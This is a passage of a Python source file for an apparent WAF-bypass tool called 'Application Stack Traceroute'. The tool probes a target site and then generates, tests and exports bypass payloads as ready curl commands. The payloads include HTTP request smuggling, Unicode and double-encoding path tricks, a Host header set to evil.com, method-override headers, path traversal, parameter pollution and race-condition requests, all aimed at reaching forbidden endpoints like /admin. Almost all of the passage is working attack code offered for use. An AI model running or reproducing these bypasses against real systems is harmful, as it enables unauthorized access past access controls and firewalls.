            # Test with different timing delays
            test_data = "param=value&admin=true"
            delays = [0, 0.001, 0.01, 0.1]  # Different micro-timing
            
            threads = []
            for delay in delays:
                thread = threading.Thread(target=send_delayed_request, args=(delay, test_data))
                threads.append(thread)
                thread.start()
            
            # Wait for all threads
            for thread in threads:
                thread.join()
            
            # Analyze timing results
            timing_results = []
            while not results.empty():
                timing_results.append(results.get())
            
            # Check for timing-dependent differences
            status_codes = [r[1] for r in timing_results if r[0] == 'success']
            if len(set(status_codes)) > 1:
                discrepancy = {
                    'type': 'Timing Race Condition',
                    'description': 'Timing affects request processing',
                    'timing_results': timing_results,
                    'unique_responses': len(set(status_codes))
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Timing Race", f"Timing-dependent responses: {len(set(status_codes))}")
                
        except Exception as e:
            pass

    def test_http_smuggling(self):
        """Test for HTTP request smuggling vulnerabilities"""
        print("  🔀 Testing HTTP Request Smuggling...")
        
        smuggling_payloads = [
            # CL-TE discrepancy
            {
                'headers': {
                    'Content-Length': '13',
                    'Transfer-Encoding': 'chunked'
                },
                'data': '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n'
            },
            # TE-CL discrepancy
            {
                'headers': {
                    'Transfer-Encoding': 'chunked',
                    'Content-Length': '0'
                },
                'data': '1\r\nZ\r\n0\r\n\r\n'
            }
        ]
        
        for i, payload in enumerate(smuggling_payloads):
            try:
                marker = self.generate_unique_markers()['uuid']
                
                # Send smuggling attempt
                response = self.session.post(
                    self.target_url,
                    headers=payload['headers'],
                    data=payload['data'].replace('internal', marker),
                    timeout=5
                )
                
                # Look for signs of successful smuggling
                if marker in response.text or response.status_code in [400, 413, 414]:
                    discrepancy = {
                        'type': 'HTTP Smuggling',
                        'test_id': f'smuggling_{i}',
                        'payload': payload,
                        'response_code': response.status_code,
                        'evidence': marker in response.text
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "HTTP Smuggling", f"Potential smuggling in test {i}")
                    
            except Exception as e:
                continue

    def test_unicode_confusion(self):
        """Test Unicode normalization discrepancies"""
        print("  🧬 Testing Unicode Confusion...")
        
        unicode_tests = [
            # Normalization form differences
            {
                'original': '/admin',
                'nfc': '/admin',  # NFC normalization
                'nfd': '/\u0061\u0300\u0064\u006D\u0069\u006E',  # NFD with combining chars
                'confusables': '/αdmin',  # Unicode confusables (α vs a)
            },
            # Zero-width character injection
            {
                'original': '/admin',
                'zwsp': '/ad\u200Bmin',  # Zero-width space
                'zwnj': '/ad\u200Cmin',  # Zero-width non-joiner
                'zwj': '/ad\u200Dmin',   # Zero-width joiner
            }
        ]
        
        for test_group in unicode_tests:
            original = test_group['original']
            
            for variant_name, variant_path in test_group.items():
                if variant_name == 'original':
                    continue
                    
                try:
                    # Test original path
                    resp_original = self.session.get(f"{self.target_url}{original}")
                    
                    # Test variant path  
                    resp_variant = self.session.get(f"{self.target_url}{variant_path}")
                    
                    # Compare responses
                    if resp_original.status_code != resp_variant.status_code:
                        discrepancy = {
                            'type': 'Unicode Confusion',
                            'variant': variant_name,
                            'original_path': original,
                            'variant_path': variant_path,
                            'original_code': resp_original.status_code,
                            'variant_code': resp_variant.status_code
                        }
                        self.chain_map['discrepancies'].append(discrepancy)
                        self.log_discovery("Discrepancy", "Unicode", f"{variant_name}: {resp_original.status_code} vs {resp_variant.status_code}")
                        
                except Exception as e:
                    continue

    def test_encoding_discrepancies(self):
        """Test multi-layer encoding discrepancies"""
        print("  🔢 Testing Encoding Discrepancies...")
        
        test_path = "/admin"
        
        encoding_chains = [
            # URL encoding chains
            {
                'name': 'Double URL Encoding',
                'path': urllib.parse.quote(urllib.parse.quote(test_path)),
            },
            # HTML entity encoding
            {
                'name': 'HTML Entity Encoding',
                'path': ''.join(f'&#{ord(c)};' for c in test_path),
            },
            # Mixed encoding
            {
                'name': 'Mixed Encoding',
                'path': test_path.replace('a', '%61').replace('d', '&#100;'),
            },
            # Base64 in parameter
            {
                'name': 'Base64 Parameter',
                'path': f"/?path={base64.b64encode(test_path.encode()).decode()}",
            }
        ]
        
        # Get baseline response
        try:
            baseline = self.session.get(f"{self.target_url}{test_path}")
        except:
            return
        
        for encoding in encoding_chains:
            try:
                response = self.session.get(f"{self.target_url}{encoding['path']}")
                
                # Compare with baseline
                if response.status_code != baseline.status_code:
                    discrepancy = {
                        'type': 'Encoding Discrepancy',
                        'encoding_name': encoding['name'],
                        'encoded_path': encoding['path'],
                        'baseline_code': baseline.status_code,
                        'encoded_code': response.status_code
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "Encoding", f"{encoding['name']}: {baseline.status_code} vs {response.status_code}")
                    
            except Exception as e:
                continue

    def test_header_confusion(self):
        """Test header parsing discrepancies"""
        print("  📋 Testing Header Confusion...")
        
        header_tests = [
            # Host header confusion
            {
                'name': 'Host Header Injection',
                'headers': {
                    'Host': 'evil.com',
                    'X-Host': self.parsed_url.netloc,
                }
            },
            # Method override
            {
                'name': 'Method Override',
                'headers': {
                    'X-HTTP-Method-Override': 'DELETE',
                    'X-HTTP-Method': 'PUT',
                    'X-Method-Override': 'PATCH'
                }
            },
            # Content-Type confusion
            {
                'name': 'Content-Type Confusion',
                'headers': {
                    'Content-Type': 'application/json',
                    'X-Content-Type': 'application/x-www-form-urlencoded'
                }
            }
        ]
        
        for test in header_tests:
            try:
                response = self.session.get(self.target_url, headers=test['headers'])
                
                # Look for unusual responses that might indicate processing differences
                if response.status_code in [400, 405, 413, 414, 502, 503]:
                    discrepancy = {
                        'type': 'Header Confusion',
                        'test_name': test['name'],
                        'headers': test['headers'],
                        'response_code': response.status_code,
                        'response_headers': dict(response.headers)
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "Header", f"{test['name']}: {response.status_code}")
                    
            except Exception as e:
                continue

    def test_method_confusion(self):
        """Test HTTP method handling discrepancies"""
        print("  🔄 Testing Method Confusion...")
        
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE']
        results = {}
        
        for method in methods:
            try:
                response = self.session.request(method, self.target_url, timeout=5)
                results[method] = response.status_code
            except Exception as e:
                results[method] = f"Error: {str(e)}"
        
        # Look for inconsistencies
        unique_responses = set(results.values())
        if len(unique_responses) > 2:  # More than just 200 and 405
            discrepancy = {
                'type': 'Method Confusion',
                'method_responses': results,
                'unique_responses': len(unique_responses)
            }
            self.chain_map['discrepancies'].append(discrepancy)
            self.log_discovery("Discrepancy", "Methods", f"Inconsistent method handling: {len(unique_responses)} different responses")

    def test_path_normalization(self):
        """Test path normalization discrepancies"""
        print("  📁 Testing Path Normalization...")
        
        base_path = "/admin"
        path_variants = [
            "/admin",
            "/admin/",
            "/admin//",
            "/admin/.",
            "/admin/../admin",
            "/./admin",
            "//admin",
            "/admin/./",
            "/admin/../",
            "/admin%2f",
            "/admin%2F",
            "/admin%5c",
            "/admin%5C"
        ]
        
        responses = {}
        for path in path_variants:
            try:
                response = self.session.get(f"{self.target_url}{path}")
                responses[path] = response.status_code
            except Exception as e:
                responses[path] = f"Error: {str(e)}"
        
        # Look for discrepancies
        unique_responses = set(responses.values())
        if len(unique_responses) > 1:
            discrepancy = {
                'type': 'Path Normalization',
                'path_responses': responses,
                'unique_responses': len(unique_responses)
            }
            self.chain_map['discrepancies'].append(discrepancy)
            self.log_discovery("Discrepancy", "Path Normalization", f"Inconsistent path handling: {len(unique_responses)} different responses")

    def test_parameter_pollution(self):
        """Test parameter pollution discrepancies"""
        print("  🔀 Testing Parameter Pollution...")
        
        pollution_tests = [
            "?param=value1&param=value2",
            "?param=value1&PARAM=value2",
            "?param[]=value1&param[]=value2",
            "?param=value1&param%5b%5d=value2"
        ]
        
        responses = {}
        for test in pollution_tests:
            try:
                response = self.session.get(f"{self.target_url}{test}")
                responses[test] = response.status_code
            except Exception as e:
                responses[test] = f"Error: {str(e)}"
        
        # Check for discrepancies
        unique_responses = set(responses.values())
        if len(unique_responses) > 1:
            discrepancy = {
                'type': 'Parameter Pollution',
                'pollution_responses': responses,
                'unique_responses': len(unique_responses)
            }
            self.chain_map['discrepancies'].append(discrepancy)
            self.log_discovery("Discrepancy", "Parameter Pollution", f"Inconsistent parameter handling: {len(unique_responses)} different responses")

    def generate_custom_bypasses(self):
        """Generate custom bypass payloads based on discovered discrepancies"""
        print("\n🔍 Phase 4: Custom Bypass Generation")
        
        if not self.chain_map['discrepancies']:
            print("  ℹ️ No discrepancies found - generating generic bypasses")
            self.generate_generic_bypasses()
            return
        
        for discrepancy in self.chain_map['discrepancies']:
            bypass_payload = self.create_bypass_from_discrepancy(discrepancy)
            if bypass_payload:
                self.chain_map['bypasses'].append(bypass_payload)
                self.log_discovery("Bypass", discrepancy['type'], f"Generated custom bypass")

    def create_bypass_from_discrepancy(self, discrepancy):
        """Create a specific bypass payload from a discovered discrepancy"""
        
        try:
            if discrepancy['type'] == 'HTTP Smuggling':
                return {
                    'type': 'HTTP Smuggling Bypass',
                    'payload': discrepancy['payload'],
                    'target': 'HTTP Request Smuggling',
                    'description': f"Exploits {discrepancy['test_id']} smuggling discrepancy",
                    'test_instructions': 'Send malformed requests to bypass WAF and reach backend',
                    'curl_data': {
                        'method': 'POST',
                        'headers': discrepancy['payload']['headers'],
                        'data': discrepancy['payload']['data']
                    }
                }
            
            elif discrepancy['type'] == 'TCP Fragmentation':
                return {
                    'type': 'TCP Fragmentation Bypass',
                    'payload': discrepancy['payload'],
                    'target': 'WAF TCP inspection',
                    'description': 'Fragments TCP packets to bypass deep packet inspection',
                    'implementation': 'Use raw sockets to control TCP segmentation',
                    'curl_data': {
                        'method': 'RAW_SOCKET',
                        'note': 'Cannot be implemented with curl - requires raw socket programming'
                    }
                }
            
            elif discrepancy['type'] == 'Compression Bypass':
                return {
                    'type': 'Compression Bomb Bypass',
                    'payload': f"Compression ratio: {discrepancy['ratio']:.1f}x",
                    'target': 'WAF payload size limits',
                    'description': f"Small compressed payload ({discrepancy['compressed_size']} bytes) expands to {discrepancy['uncompressed_size']} bytes",
                    'implementation': 'Use gzip compression with high expansion ratio',
                    'curl_data': {
                        'method': 'POST',
                        'headers': {'Content-Encoding': 'gzip'},
                        'data_file': 'compressed_payload.gz',
                        'note': 'Create gzip file with large repeated content'
                    }
                }
            
            elif discrepancy['type'] == 'Timing Race Condition':
                return {
                    'type': 'Timing Race Bypass',
                    'payload': 'Concurrent requests with micro-timing',
                    'target': 'Parser state machine',
                    'description': f"Timing variations produce {discrepancy['unique_responses']} different responses",
                    'implementation': 'Send requests with precise timing delays',
                    'curl_data': {
                        'method': 'PARALLEL',
                        'commands': [
                            'curl -X POST $URL -d "param=value&admin=true" &',
                            'sleep 0.001 && curl -X POST $URL -d "param=value&admin=true" &',
                            'sleep 0.01 && curl -X POST $URL -d "param=value&admin=true" &'
                        ]
                    }
                }
            
            elif discrepancy['type'] == 'Unicode Confusion':
                return {
                    'type': 'Unicode Bypass',
                    'payload': discrepancy['variant_path'],
                    'target': 'WAF Unicode normalization',
                    'description': f"Uses {discrepancy['variant']} to bypass filters",
                    'curl_data': {
                        'method': 'GET',
                        'path': discrepancy['variant_path']
                    }
                }
            
            elif discrepancy['type'] == 'Encoding Discrepancy':
                return {
                    'type': 'Encoding Bypass',
                    'payload': discrepancy['encoded_path'],
                    'target': f"{discrepancy['encoding_name']} confusion",
                    'description': f"Exploits encoding differences between layers",
                    'curl_data': {
                        'method': 'GET',
                        'path': discrepancy['encoded_path']
                    }
                }
            
            elif discrepancy['type'] == 'Header Confusion':
                return {
                    'type': 'Header Bypass',
                    'payload': discrepancy['headers'],
                    'target': 'Header parsing differences',
                    'description': f"Exploits {discrepancy['test_name']} confusion",
                    'curl_data': {
                        'method': 'GET',
                        'headers': discrepancy['headers']
                    }
                }
            
            elif discrepancy['type'] == 'Path Normalization':
                # Find the most different response
                responses = discrepancy['path_responses']
                most_different = min(responses.items(), key=lambda x: x[1] if isinstance(x[1], int) else 999)
                return {
                    'type': 'Path Bypass',
                    'payload': most_different[0],
                    'target': 'Path normalization differences',
                    'description': f"Exploits path handling inconsistencies",
                    'curl_data': {
                        'method': 'GET',
                        'path': most_different[0]
                    }
                }
            
            elif discrepancy['type'] == 'Parameter Pollution':
                return {
                    'type': 'Parameter Pollution Bypass',
                    'payload': 'Multiple parameter values',
                    'target': 'Parameter parsing differences',
                    'description': f"Exploits inconsistent parameter handling across {discrepancy['unique_responses']} layers",
                    'curl_data': {
                        'method': 'GET',
                        'query': '?param=safe&param=admin&PARAM=test'
                    }
                }
            
            # New advanced bypass types
            elif discrepancy['type'] == 'Parser State Confusion':
                if discrepancy['subtype'] == 'H2 Pseudo-Header Injection':
                    return {
                        'type': 'H2 Pseudo-Header Bypass',
                        'payload': discrepancy['headers'],
                        'target': 'HTTP/2 to HTTP/1.1 downgrade',
                        'description': 'Exploits H2 pseudo-header acceptance in H1 context',
                        'curl_data': {
                            'method': 'GET',
                            'headers': discrepancy['headers'],
                            'note': 'Use --http2 flag if supported'
                        }
                    }
                elif discrepancy['subtype'] == 'WebSocket State Leak':
                    return {
                        'type': 'WebSocket State Bypass',
                        'payload': 'WebSocket upgrade followed by normal request',
                        'target': 'Protocol state machine',
                        'description': 'Exploits state leakage between WebSocket and HTTP',
                        'curl_data': {
                            'method': 'SEQUENCE',
                            'commands': [
                                'curl -H "Upgrade: websocket" -H "Connection: Upgrade" $URL',
                                'curl $URL/admin'
                            ]
                        }
                    }
            
            elif discrepancy['type'] == 'Buffer Boundary':
                # Handle different buffer types safely
                buffer_size = discrepancy.get('buffer_size', 0)
                return {
                    'type': 'Buffer Overflow Bypass',
                    'payload': f"{buffer_size} byte boundary",
                    'target': 'Parser buffer limits',
                    'description': f"Exploits {discrepancy.get('subtype', 'buffer limit')} at {buffer_size} bytes",
                    'curl_data': {
                        'method': 'GET',
                        'headers': {'X-Large-Header': 'A' * (buffer_size - 100) if buffer_size > 100 else 'A' * 50},
                        'note': f'Add payload after {buffer_size} byte boundary'
                    }
                }
            
            elif discrepancy['type'] == 'Nested Encoding':
                return {
                    'type': 'Multi-Encoding Bypass',
                    'payload': discrepancy.get('encoded_path', discrepancy.get('payload', 'Mixed encoding')),
                    'target': 'Encoding parser stack',
                    'description': f"Exploits {discrepancy['subtype']} encoding confusion",
                    'curl_data': {
                        'method': 'GET',
                        'path': discrepancy.get('encoded_path', '/admin'),
                        'encoding': discrepancy['subtype']
                    }
                }
            
            elif discrepancy['type'] == 'Cache Key Confusion':
                return {
                    'type': 'Cache Poisoning Bypass',
                    'payload': 'Case/parameter variations',
                    'target': 'CDN cache key generation',
                    'description': f"Exploits {discrepancy['subtype']} in cache key computation",
                    'curl_data': {
                        'method': 'GET',
                        'variations': discrepancy.get('variations', {}),
                        'note': 'Try different case/parameter order combinations'
                    }
                }
            
            elif discrepancy['type'] == 'ML WAF Evasion':
                return {
                    'type': 'ML Model Bypass',
                    'payload': discrepancy['subtype'],
                    'target': 'Machine learning WAF model',
                    'description': f"Uses {discrepancy['subtype']} to evade ML detection",
                    'curl_data': {
                        'method': 'POST' if discrepancy['subtype'] == 'Context Window Overflow' else 'GET',
                        'payload_size': discrepancy.get('payload_size', 0),
                        'technique': discrepancy['subtype']
                    }
                }
            
            elif discrepancy['type'] == 'Container Orchestration':
                return {
                    'type': 'K8s Service Mesh Bypass',
                    'payload': discrepancy['headers'],
                    'target': 'Service mesh routing',
                    'description': 'Exploits Kubernetes service mesh headers',
                    'curl_data': {
                        'method': 'GET',
                        'headers': discrepancy['headers'],
                        'path': '/admin'
                    }
                }
            
            elif discrepancy['type'] == 'TOCTOU Race':
                return {
                    'type': 'TOCTOU Bypass',
                    'payload': 'Race condition timing attack',
                    'target': 'Async validation logic',
                    'description': 'Exploits time-of-check vs time-of-use race condition',
                    'curl_data': {
                        'method': 'RACE',
                        'timing': discrepancy.get('timing_results', []),
                        'note': 'Requires precise timing between requests'
                    }
                }
            
            elif discrepancy['type'] == 'Protocol Tunneling':
                return {
                    'type': 'Protocol Tunneling Bypass',
                    'payload': discrepancy.get('technique', 'Protocol confusion'),
                    'target': 'Protocol parser',
                    'description': f"Exploits {discrepancy.get('subtype', 'protocol')} confusion",
                    'curl_data': {
                        'method': 'GET',
                        'headers': discrepancy.get('headers', {}),
                        'note': 'May require special protocol handling'
                    }
                }
            
            return None
        
        except Exception as e:
            print(f"  ⚠️ Error creating bypass for {discrepancy.get('type', 'unknown')}: {str(e)}")
            return None

    def generate_generic_bypasses(self):
        """Generate generic bypass techniques"""
        generic_bypasses = [
            {
                'type': 'Generic Path Traversal',
                'payload': '/./target/../',
                'target': 'Path normalization',
                'description': 'Classic path traversal technique',
                'curl_data': {
                    'method': 'GET',
                    'path': '/./admin/../admin'
                }
            },
            {
                'type': 'Generic Double Encoding',
                'payload': '%252e%252e%252f',
                'target': 'Double URL decoding',
                'description': 'Double URL encoding bypass',
                'curl_data': {
                    'method': 'GET',
                    'path': '/%252e%252e%252fadmin'
                }
            },
            {
                'type': 'Generic Unicode',
                'payload': '/αdmin',  # α looks like 'a'
                'target': 'Unicode confusables',
                'description': 'Unicode lookalike characters',
                'curl_data': {
                    'method': 'GET',
                    'path': '/αdmin'
                }
            }
        ]
        
        self.chain_map['bypasses'].extend(generic_bypasses)

    def test_generated_bypasses(self):
        """Test the generated bypass payloads"""
        print("\n🔍 Phase 5: Bypass Validation")
        
        if not self.chain_map['bypasses']:
            print("  ℹ️ No bypasses to test")
            return
        
        # Check if we have a forbidden endpoint to test against
        if not self.discovered_forbidden_endpoint and not self.skip_forbidden_tests:
            print("  ⚠️ No forbidden endpoint available for bypass validation")
            print("  💡 Use --forbidden-endpoint to specify one for better validation")
            return
        
        for bypass in self.chain_map['bypasses']:
            success = self.validate_bypass(bypass)
            bypass['validated'] = success
            
            status = "✅" if success else "❌"
            print(f"  {status} {bypass['type']}: {bypass['description']}")

    def validate_bypass(self, bypass):
        """Validate a specific bypass technique"""
        try:
            print(f"    🔍 Testing {bypass['type']}: {bypass['description']}")
            
            # Use discovered forbidden endpoint if available
            test_url = self.discovered_forbidden_endpoint or f"{self.target_url}/admin"
            
            if bypass['type'] in ['Unicode Bypass', 'Path Bypass']:
                response = self.session.get(f"{self.target_url}{bypass['payload']}")
                success = response.status_code not in [403, 406, 418, 429]
                print(f"      Response: {response.status_code} ({'SUCCESS' if success else 'BLOCKED'})")
                return success
            
            elif bypass['type'] == 'Header Bypass':
                response = self.session.get(test_url, headers=bypass['payload'])
                success = response.status_code not in [403, 406, 418, 429]
                print(f"      Response: {response.status_code} ({'SUCCESS' if success else 'BLOCKED'})")
                return success
            
            elif bypass['type'] == 'Encoding Bypass':
                response = self.session.get(f"{self.target_url}{bypass['payload']}")
                success = response.status_code not in [403, 406, 418, 429]
                print(f"      Response: {response.status_code} ({'SUCCESS' if success else 'BLOCKED'})")
                return success
            
            elif bypass['type'] == 'HTTP Smuggling Bypass':
                # Test HTTP smuggling by sending the malformed request
                payload = bypass['payload']
                if isinstance(payload, dict) and 'headers' in payload and 'data' in payload:
                    response = self.session.post(
                        self.target_url, 
                        headers=payload['headers'], 
                        data=payload['data'],
                        timeout=10
                    )
                    # Smuggling success indicators: unusual status codes or response patterns
                    success = response.status_code in [200, 400, 413, 414, 502] or 'smuggl' in response.text.lower()
                    print(f"      Response: {response.status_code}, Content-Length: {len(response.content)} ({'POTENTIAL' if success else 'FAILED'})")
                    return success
                else:
                    print(f"      Invalid payload format")
                    return False
            
            elif bypass['type'] == 'TCP Fragmentation Bypass':
                # Test TCP fragmentation by attempting fragmented connection
                try:
                    import socket
                    target_host = self.parsed_url.hostname
                    target_port = 443 if self.parsed_url.scheme == 'https' else 80
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    
                    if self.parsed_url.scheme == 'https':
                        import ssl
                        context = ssl.create_default_context()
                        sock = context.wrap_socket(sock, server_hostname=target_host)
                    
                    sock.connect((target_host, target_port))
                    
                    # Send fragmented HTTP request
                    sock.send(b"GET / HTTP/1.1\r\n")
                    time.sleep(0.01)
                    sock.send(f"Host: {target_host}\r\n\r\n".encode())
                    
                    response = sock.recv(1024)
                    sock.close()
                    
                    success = b"200 OK" in response or b"HTTP" in response
                    print(f"      Fragmented connection: {'SUCCESS' if success else 'FAILED'}")
                    return success
                    
                except Exception as e:
                    print(f"      Fragmentation test failed: {str(e)}")
                    return False
            
            elif bypass['type'] == 'Compression Bomb Bypass':
                # Test compression bomb by sending compressed payload
                try:
                    import gzip
                    test_payload = "test=admin&user=root" * 100  # Expand this
                    compressed = gzip.compress(test_payload.encode())
                    
                    headers = {
                        'Content-Encoding': 'gzip',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Content-Length': str(len(compressed))
                    }
                    
                    response = self.session.post(self.target_url, data=compressed, headers=headers, timeout=10)
                    success = response.status_code in [200, 413, 414, 502]  # Any processing = potential bypass
                    ratio = len(test_payload) / len(compressed)
                    print(f"      Compression {ratio:.1f}x, Response: {response.status_code} ({'POTENTIAL' if success else 'BLOCKED'})")
                    return success
                    
                except Exception as e:
                    print(f"      Compression test failed: {str(e)}")
                    return False
            
            elif bypass['type'] == 'Timing Race Bypass':
                # Test timing race by sending concurrent requests
                try:
                    import threading
                    results = []
                    
                    def test_request():
                        try:
                            response = self.session.get(test_url, timeout=5)
                            results.append(response.status_code)
                        except:
                            results.append(0)
                    
                    # Send 3 concurrent requests
                    threads = []
                    for _ in range(3):
                        thread = threading.Thread(target=test_request)
                        threads.append(thread)
                        thread.start()
                    
                    for thread in threads:
                        thread.join()
                    
                    unique_results = set(results)
                    success = len(unique_results) > 1  # Different responses = timing affects processing
                    print(f"      Timing test results: {results}, Unique: {len(unique_results)} ({'SUCCESS' if success else 'CONSISTENT'})")
                    return success
                    
                except Exception as e:
                    print(f"      Timing test failed: {str(e)}")
                    return False
            
            elif bypass['type'] == 'Parameter Pollution Bypass':
                # Test parameter pollution
                test_url_pollution = f"{test_url}?param=safe&param=admin&PARAM=test"
                response = self.session.get(test_url_pollution)
                success = response.status_code not in [403, 406, 418, 429]
                print(f"      Parameter pollution: {response.status_code} ({'SUCCESS' if success else 'BLOCKED'})")
                return success
            
            else:
                print(f"      Unknown bypass type: {bypass['type']}")
                return False
                
        except Exception as e:
            print(f"      Validation error: {str(e)}")
            return False

    def export_bypasses_json(self):
        """Export bypasses to JSON file for curl generation"""
        if not self.chain_map['bypasses']:
            print("\n⚠️ No bypasses to export")
            return None
        
        # Prepare bypass data for JSON export
        export_data = {
            'target_url': self.target_url,
            'scan_timestamp': datetime.now().isoformat(),
            'infrastructure_chain': self.chain_map['layers'],
            'total_discrepancies': len(self.chain_map['discrepancies']),
            'total_bypasses': len(self.chain_map['bypasses']),
            'bypasses': []
        }
        
        for bypass in self.chain_map['bypasses']:
            bypass_entry = {
                'id': f"bypass_{len(export_data['bypasses']) + 1}",
                'type': bypass['type'],
                'target': bypass['target'],
                'description': bypass['description'],
                'validated': bypass.get('validated', False),
                'curl_data': bypass.get('curl_data', {}),
                'payload': str(bypass.get('payload', ''))
            }
            
            # Generate curl command based on bypass type
            curl_command = self.generate_curl_command(bypass_entry)
            bypass_entry['curl_command'] = curl_command
            
            export_data['bypasses'].append(bypass_entry)
        
        # Save to JSON file
        filename = f"bypasses_{self.parsed_url.netloc}_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(export_data, f, indent=2, default=str)
        
        print(f"\n✅ Bypasses exported to: {filename}")
        print(f"   Total bypasses: {len(export_data['bypasses'])}")
        print(f"   Validated: {len([b for b in export_data['bypasses'] if b['validated']])}")
        
        return filename

    def generate_curl_command(self, bypass_entry):
        """Generate curl command for a specific bypass"""
        base_url = self.target_url
        curl_data = bypass_entry.get('curl_data', {})
        
        if not curl_data:
            return f"# No curl data available for {bypass_entry['type']}"
        
        method = curl_data.get('method', 'GET')
        
        if method == 'RAW_SOCKET':
            return f"# {bypass_entry['type']} requires raw socket programming - cannot be implemented with curl"
        
        elif method == 'SEQUENCE':
            commands = curl_data.get('commands', [])
            return '\n'.join([f"# Step {i+1}: {cmd.replace('$URL', base_url)}" 
                            for i, cmd in enumerate(commands)])
        
        elif method == 'PARALLEL':
            commands = curl_data.get('commands', [])
            return '\n'.join([cmd.replace('$URL', base_url) for cmd in commands])
        
        elif method == 'RACE':
            return f"# Race condition attack - requires precise timing\n# Use multiple terminals or scripting"
        
        else:
            # Build standard curl command
            cmd_parts = ['curl']
            
            # Add method
            if method != 'GET':
                cmd_parts.append(f'-X {method}')
            
            # Add headers
            headers = curl_data.get('headers', {})
            for header, value in headers.items():
                if not header.startswith(':'):  # Skip HTTP/2 pseudo-headers
                    cmd_parts.append(f'-H "{header}: {value}"')
            
            # Add data
            if 'data' in curl_data:
                if isinstance(curl_data['data'], str):
                    cmd_parts.append(f'-d "{curl_data["data"]}"')
                elif isinstance(curl_data['data'], dict):
                    cmd_parts.append(f"-d '{json.dumps(curl_data['data'])}'")
            
            # Add path/query
            path = curl_data.get('path', '')
            query = curl_data.get('query', '')
            full_url = f"{base_url}{path}{query}"
            
            cmd_parts.append(f'"{full_url}"')
            
            # Add notes
            if 'note' in curl_data:
                return f"# Note: {curl_data['note']}\n{' '.join(cmd_parts)}"
            
            return ' '.join(cmd_parts)

    def generate_report(self):
        """Generate comprehensive analysis report"""
        
        report = f"""
========================================
APPLICATION STACK TRACEROUTE REPORT
========================================

Target: {self.target_url}
Scan Time: {time.strftime('%Y-%m-%d %H:%M:%S')}

🔍 PROTOCOL SUPPORT:
HTTP/1.1: ✅
HTTP/2: {"✅" if self.protocols['http2'] else "❌"}
HTTP/3: {"✅" if self.protocols['http3'] else "❌"}
WebSocket: {"✅" if self.protocols['websocket'] else "❌"}

🏗️ INFRASTRUCTURE CHAIN:
{' → '.join(self.chain_map['layers']) if self.chain_map['layers'] else 'Unable to map complete chain'}

🔍 DISCOVERED COMPONENTS:
"""
        
        for layer, discoveries in self.chain_map['fingerprints'].items():
            report += f"\n{layer}:\n"
            for discovery_type, details in discoveries.items():
                report += f"  - {discovery_type}: {details}\n"
        
        # Add forbidden endpoint info
        if self.discovered_forbidden_endpoint:
            report += f"\n🚫 FORBIDDEN ENDPOINT: {self.discovered_forbidden_endpoint}\n"
        elif not self.skip_forbidden_tests:
            report += f"\n⚠️ NO FORBIDDEN ENDPOINT FOUND - Some tests were limited\n"
        
        report += f"""
🚨 PARSING DISCREPANCIES FOUND: {len(self.chain_map['discrepancies'])}
"""
        
        # Group discrepancies by type
        discrepancy_types = {}
        for discrepancy in self.chain_map['discrepancies']:
            disc_type = discrepancy['type']
            if disc_type not in discrepancy_types:
                discrepancy_types[disc_type] = []
            discrepancy_types[disc_type].append(discrepancy)
        
        for disc_type, discrepancies in discrepancy_types.items():
            report += f"\n{disc_type} ({len(discrepancies)} found):\n"
            for disc in discrepancies[:3]:  # Show first 3 of each type
                if 'description' in disc:
                    report += f"  - {disc.get('description', 'N/A')}\n"
                if 'subtype' in disc:
                    report += f"    Subtype: {disc['subtype']}\n"
        
        report += f"""
🎯 GENERATED BYPASSES: {len(self.chain_map['bypasses'])}
"""
        
        validated_bypasses = [b for b in self.chain_map['bypasses'] if b.get('validated', False)]
        
        for bypass in self.chain_map['bypasses']:
            status = "✅ VALIDATED" if bypass.get('validated', False) else "❌ FAILED"
            report += f"\n{status} {bypass['type']}\n"
            report += f"   Target: {bypass['target']}\n"
            report += f"   Description: {bypass['description']}\n"
        
        report += f"""
📊 SUMMARY:
- Total Layers Identified: {len(self.chain_map['layers'])}
- Discrepancies Found: {len(self.chain_map['discrepancies'])}
- Generated Bypasses: {len(self.chain_map['bypasses'])}
- Validated Bypasses: {len(validated_bypasses)}

🔬 RESEARCH VALUE:
This analysis provides insights into the complete request processing chain
and identifies potential bypass opportunities based on parsing discrepancies
between different infrastructure layers.

Advanced techniques tested include:
- Parser state machine desynchronization
- Buffer boundary exploitation
- Multi-layer encoding confusion
- Protocol tunneling attacks
- Cache poisoning vectors
- ML WAF evasion methods
- Container orchestration bypasses

========================================
"""
        
        return report

    async def run_full_analysis(self):
        """Run the complete application traceroute analysis"""
        print("🚀 Starting Application Stack Traceroute Analysis")
        print("=" * 60)
        
        # Phase 0: Find forbidden endpoint
        self.find_forbidden_endpoint()
        
        # Phase 1: Protocol Discovery
        await self.protocol_discovery()
        
        # Phase 2: Infrastructure Fingerprinting
        self.infrastructure_fingerprinting()
        
        # Phase 3: Parser Discrepancy Testing (Enhanced)
        self.parser_discrepancy_testing()
        
        # Phase 4: Custom Bypass Generation
        self.generate_custom_bypasses()
        
        # Phase 5: Bypass Validation
        self.test_generated_bypasses()
        
        # Export bypasses to JSON
        json_file = self.export_bypasses_json()
        
        print("\n" + "=" * 60)
        print("📊 ANALYSIS COMPLETE")
        print("=" * 60)
        
        return self.generate_report()


def main():
    import sys
    import argparse
    
    parser = argparse.ArgumentParser(description='Application Stack Traceroute - WAF/Proxy/Backend Chain Analysis')
    parser.add_argument('target', help='Target URL to analyze')
    parser.add_argument('--forbidden-endpoint', help='Known 403/401 endpoint for bypass testing (e.g. https://target.com/admin)')
    parser.add_argument('--skip-forbidden-tests', action='store_true', help='Skip tests requiring forbidden endpoint')
    
    args = parser.parse_args()
    
    print("🔬 APPLICATION STACK TRACEROUTE - ENHANCED VERSION")
    print("🎯 Next-Generation Infrastructure Analysis with Advanced Bypass Techniques")
    print("=" * 70)
    
    async def run_analysis():
        tracer = ApplicationTraceroute(
            args.target,
            forbidden_endpoint=args.forbidden_endpoint,
            skip_forbidden_tests=args.skip_forbidden_tests
        )
        report = await tracer.run_full_analysis()
        
